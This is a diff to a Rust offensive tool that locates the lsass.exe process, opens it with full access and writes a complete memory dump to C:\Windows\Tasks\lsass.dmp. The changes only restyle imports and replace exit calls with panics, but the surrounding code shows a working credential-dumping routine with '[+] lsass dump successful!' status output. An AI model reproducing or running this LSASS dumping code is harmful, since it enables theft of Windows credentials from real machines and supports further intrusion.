@@ -6,8 +6,14 @@ use windows::Win32::Storage::FileSystem::{
     CreateFileA, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_READ,
     FILE_SHARE_WRITE,
 };
-use windows::Win32::System::Diagnostics::Debug::{MiniDumpWithFullMemory, MiniDumpWriteDump};
-use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};
+use windows::Win32::System::{
+    Diagnostics::Debug::{
+        MiniDumpWithFullMemory, MiniDumpWriteDump
+    }, 
+    Threading::{
+        OpenProcess, PROCESS_ALL_ACCESS
+    }
+};
 
 fn find_lsass() -> Result<u32, String> {
     let mut system = System::new_all();
@@ -31,13 +37,11 @@ fn find_lsass() -> Result<u32, String> {
 fn main() {
     unsafe {
         let pid_lsass = find_lsass().unwrap_or_else(|e| {
-            eprintln!("[!] find_lsass Failed With Error: {e}");
-            exit(-1);
+            panic!("[!] find_lsass Failed With Error: {e}");
         });
 
         let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid_lsass).unwrap_or_else(|e| {
-            eprintln!("[!] OpenProcess Failed With Error: {e}");
-            exit(-1);
+            panic!("[!] OpenProcess Failed With Error: {e}");
         });
 
         let path = CString::new("C:\\Windows\\Tasks\\lsass.dmp").expect("CString::new failed");
@@ -50,10 +54,8 @@ fn main() {
             CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
             HANDLE(0),
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateFileA Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateFileA Failed With Error: {e}");
         });
 
         println!("[+] HANDLE lsass.exe: {:?}", hprocess);
@@ -67,10 +69,8 @@ fn main() {
             None,
             None,
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] MiniDumpWriteDump Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] MiniDumpWriteDump Failed With Error: {e}");
         });
 
         println!("[+] lsass dump successful!");
